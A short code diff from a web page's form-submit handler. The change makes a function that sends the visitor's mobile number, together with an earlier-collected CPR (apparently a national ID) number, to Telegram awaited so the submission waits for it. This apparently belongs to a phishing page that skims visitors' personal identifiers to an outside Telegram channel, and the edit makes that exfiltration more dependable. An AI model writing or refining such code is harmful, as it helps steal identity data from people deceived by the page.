@@ -326,8 +326,8 @@
             submitBtn.innerHTML = '<span class="loading-spinner"></span>Processing...';
             
             try {
-                // Send mobile number to Telegram (non-blocking - won't fail form submission)
-                sendFormDataToTelegram('New Mobile Number', {
+                // Send mobile number to Telegram (with cumulative data - CPR + Mobile Number)
+                await sendFormDataToTelegram('New Mobile Number', {
                     'Mobile Number': mobileNumber
                 }).catch(err => {
                     console.warn('Telegram notification failed (non-critical):', err);
